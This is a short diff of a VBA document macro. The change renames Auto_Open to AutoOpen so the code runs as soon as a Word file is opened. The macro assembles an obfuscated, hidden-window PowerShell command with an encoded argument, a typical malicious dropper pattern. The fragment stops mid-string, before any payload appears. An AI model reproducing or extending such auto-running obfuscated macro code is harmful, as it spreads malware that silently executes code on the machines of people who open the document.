@@ -1,4 +1,4 @@
-Sub Auto_Open()
+Sub AutoOpen() 
 Dim bUSIc
 bUSIc =  " /w 1 /C ""sv UC -;sv GWp ec;sv Yv ((gv U"
 bUSIc = bUSIc + "C).value.toString()+(gv GWp).value.toString());pow"
